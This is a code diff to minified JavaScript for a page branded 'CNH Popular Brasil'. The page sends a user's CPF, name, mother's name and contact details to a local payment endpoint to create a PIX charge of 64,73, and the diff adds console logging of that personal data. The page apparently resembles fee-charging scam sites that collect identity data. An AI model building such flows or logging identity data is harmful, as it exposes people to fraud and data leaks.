@@ -30615,24 +30615,32 @@ function DE() {
           d("Dados do usuário não encontrados");
           return;
         }
-        const _ = JSON.parse(M),
-          I = await (
-            await fetch("/api/payment/payment.php", {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json",
-              },
-              body: JSON.stringify({
-                cpf: _.cpf,
-                nome: _.nome,
-                nome_mae: _.nomeMae,
-                email: _.email || "cliente@cnhpopularbrasil.site",
-                phone: _.phone || "11999999999",
-                amount: "64,73",
-                title: "CNH Popular Brasil",
-              }),
-            })
-          ).json();
+        const _ = JSON.parse(M);
+        console.log("Dados do usuário:", _);
+        
+        const requestPayload = {
+          cpf: _.cpf,
+          nome: _.nome,
+          nome_mae: _.nomeMae || "",
+          email: _.email || "cliente@cnhpopularbrasil.site",
+          phone: _.phone || "11999999999",
+          amount: "64,73",
+          title: "CNH Popular Brasil",
+        };
+        console.log("Enviando para API:", requestPayload);
+        
+        const paymentResponse = await fetch("/api/payment/payment.php", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(requestPayload),
+        });
+        
+        console.log("Status da resposta:", paymentResponse.status);
+        const I = await paymentResponse.json();
+        console.log("Resposta da API:", I);
+        
         if (I.success) {
           if ((n(I), I.pix_code))
             try {
@@ -30647,11 +30655,15 @@ function DE() {
               h($);
             } catch ($) {
               console.error("Erro ao gerar QR code:", $);
+              d("Erro ao gerar QR code: " + $.message);
             }
-        } else d(I.error || "Erro ao gerar PIX");
+        } else {
+          console.error("Erro na resposta:", I);
+          d(I.message || I.error || "Erro ao gerar PIX");
+        }
       } catch (M) {
         (console.error("Erro ao criar transação PIX:", M),
-          d("Erro ao conectar com o servidor"));
+          d("Erro ao conectar com o servidor: " + M.message));
       } finally {
         s(!1);
       }
